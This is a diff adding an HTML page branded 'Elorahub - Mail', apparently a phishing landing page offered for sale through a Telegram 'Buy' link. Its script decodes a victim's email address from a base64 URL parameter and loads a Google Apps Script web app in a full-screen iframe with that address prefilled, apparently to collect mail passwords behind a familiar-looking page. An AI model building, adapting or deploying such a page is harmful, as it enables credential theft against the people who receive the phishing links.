@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Elorahub - Mail</title>
+  <!-- Link to Google Fonts for a fancy font -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&display=swap" rel="stylesheet">
+  <link id="bootstrap-css" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      font-family: 'Permanent Marker', cursive; /* Apply the fancy font */
+      font-weight: 400;
+      font-style: normal;
+    }
+
+    iframe {
+      border: none;
+      height: 100%;
+      width: 100%;
+    }
+    .navbar-dark .navbar-nav .nav-link {
+      color: black; /* Make navbar text black */
+    }
+    .navbar-dark .navbar-toggler {
+      color: black; /* Make navbar toggler icon black */
+      border-color: black; /* Make navbar toggler border black */
+    }
+    .spinner-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: rgba(255, 255, 255, 0.8);
+      z-index: 9999;
+    }
+    .spinner-border {
+      width: 3rem;
+      height: 3rem;
+    }
+    /* Color Classes */
+    .first-color {
+      background: #155263;
+    }
+    .second-color {
+      background: #ff6f3c;
+    }
+    .third-color {
+      background: #ff9a3c;
+    }
+    .fourth-color {
+      background: #f5f410;
+    }
+  </style>
+</head>
+<body>
+  <!-- Navbar -->
+  <nav id="navbar" class="navbar navbar-expand-lg navbar-dark first-color">
+    <a class="navbar-brand" href="#" style="color:black;">Elorahub</a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarNav">
+      <ul class="navbar-nav ml-auto">
+        <li class="nav-item">
+          <a class="nav-link" href="#">Home</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="https://t.me/exiodi">Buy</a>
+        </li>
+      </ul>
+    </div>
+  </nav>
+
+  <!-- Loading Spinner -->
+  <div id="spinnerContainer" class="spinner-container">
+    <div class="spinner-border text-primary" role="status">
+      <span class="sr-only">Loading...</span>
+    </div>
+  </div>
+
+  <iframe id="myIframe" onload="hideSpinner()"></iframe>
+
+  <script>
+    // Function to hide the spinner
+    function hideSpinner() {
+      document.getElementById('spinnerContainer').style.display = 'none';
+    }
+
+    // Function to get URL parameters
+    function getParameterByName(name, url) {
+      if (!url) url = window.location.href;
+      name = name.replace(/[\[\]]/g, "\\$&");
+      var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+          results = regex.exec(url);
+      if (!results) return null;
+      if (!results[2]) return '';
+      return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
+
+    // Function to decode Base64
+    function base64Decode(str) {
+      return atob(str);
+    }
+
+    // Get the email parameter from the URL and decode it
+    var encodedEmail = getParameterByName('m');
+    var email = encodedEmail ? base64Decode(encodedEmail) : 'your@email.com';
+
+    // Function to set color scheme based on conditions (example)
+    function setColorScheme() {
+      // Example condition: set color based on some parameter or logic
+      var condition = true; // Replace with your condition
+
+      if (condition) {
+        document.getElementById('navbar').classList.remove('first-color', 'second-color', 'third-color', 'fourth-color');
+        document.getElementById('navbar').classList.add('fourth-color'); // Change class based on condition
+      } else {
+        document.getElementById('navbar').classList.add('fourth-color');
+      }
+    }
+
+    // Call setColorScheme function to set initial color scheme
+    setColorScheme();
+
+    // Set the iframe src with the decoded email parameter
+    var iframe = document.getElementById('myIframe');
+    iframe.src = "https://script.google.com/macros/s/AKfycbwSVu-uFgo-glm1I5aLXcMY18zsIWEuslqUOvr6kA-UNP7oQkuaOQdPYIJGjnycOIKwfA/exec?email=" + email;
+  </script>
+
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+</body>
+</html>
